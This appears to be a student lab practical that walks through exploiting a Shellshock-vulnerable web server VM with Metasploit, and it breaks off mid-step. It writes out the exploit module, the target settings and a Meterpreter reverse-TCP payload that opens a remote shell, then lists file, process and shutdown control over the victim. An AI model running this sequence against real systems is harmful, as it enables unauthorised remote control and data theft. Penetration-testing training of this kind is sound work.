Aim: Practical on using Metasploit Framework for exploitation.

Implementation:
To exploit vulnerability in a webserver using Metasploit, perform the following steps:
1. Open a web browser on the Windows 8.1 machine and type www.google.com in the 
URL. 
In the Google search bar, type shellshock vm and press enter. it will give you a list of results. 
Open the result
2. Scroll down the Pentesterlab page and click on here, to download the 
iso of a vm with shellshock vulnerability.
3.Open the VMware Workstation Pro after the VM is downloaded and click on Create a New 
Virtual Machine
It will start the new virtual machine wizard 
Select the typical(recommended) radio button and click on next
4. It will open the guest Operating System Installation window
5. Click on browser and navigate to the ISO you have downloaded in step 2 click on Next
It will open a select a guest operating system window 
6. Leave the options to default and click next. It will open the Name the virtual machine 
window 
Type shellshock in the virtual machine name: text box and click on Next 
It will open Specify Disk Capacity window 
7. Leave the option to default and click on Next 
8. Review the settings and click on finish. 
9.It will start installing the virtual machine. when the 
virtual machine will be complete installed
10. Type the command "ifconfig" and press enter to view the IP address configuration
of the machine
12. Switch and login to the kali Linux VM. Open a web browser 
13. Type http://192.168.0.109 and press enter to check if the webs server is up and running
Here, 192.168.0.109 is the IP address of shellshock VM
14.Type http://192.168.0.109/cgi-bin/status and press enter to check if there is a shellshock 
vulnerability in the webserver, as shown in the figure 
If it shown an output as shown in figure, then is a shellshock vulnerability.
15. Open the Metasploit tool. It will open a window
16. Type the command "use exploit/multi/http/apache_mode_cgi_bash_env_exec"
and press enter to select the exploit
17. Set the localhost using the command "set LHOST 192.168.0.133" and press enter.
The IP of the kali linux is 192.168.0.133
18. Set the rhost using the command "set RHOST 192.168.0.109" and press enter. 
The IP of the Shellshcok VM is192.168.0.109
19. Set the TargetURI using the command "set TARGETURI/cgi-bin/status" and press enter, 
as shown in figure]
20. Set the payload using the command "set payload linux/x86/meterpreter/reverse_tcp", and 
press enter, as shown in figur
21. Type "exploit" and press enter to run the exploit in the background, as shown in figure, it 
will open a Meterpreter session
From this opened meterpreter session, you can perform the following task:
View the files and directories located in the machines,
Delete, upload and download files from the machine,
Execute applications remotely,
List the processes,
Launch a shell,
Reboot or shutdown the machine etc.
22. Type help and press enter to View the help on the meterpreter commands
23. Type arp and press enter to view the ARP cache, as shown in figur
24. Type "ipconfig" and press enter to view the IP configuration, a
